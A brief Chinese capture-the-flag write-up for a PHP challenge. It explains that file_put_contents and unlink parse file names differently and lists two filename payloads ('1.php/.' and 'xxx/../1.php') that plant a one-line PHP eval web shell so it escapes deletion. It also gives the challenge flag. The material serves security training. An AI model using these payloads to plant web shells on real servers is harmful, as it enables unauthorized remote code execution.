# Description
想写shell??? 我tm立马就删

# Difficulty
⭐⭐⭐

# Flag
`mayctf{P4Th_r3soluti0n_d3ffer3nce_mAk3_uNsafe}`

# Hint (Optional)
 1. 不需要条件竞争(为了大家的做题体验，请不要条件竞争)

# WriteUp
简单审计源代码
## 考点
  `file_put_contents`和`unlink`对文件名的解析不同
  - `file_put_contents`会进行相对路径解析
  - `unlink`不会进行相对路径解析

## payload
 1. `filename=1.php/.` `content=<?php eval($_POST[1]);?>`
 2. `filename=xxx/../1.php` `content=<?php eval($_POST[1]);?>`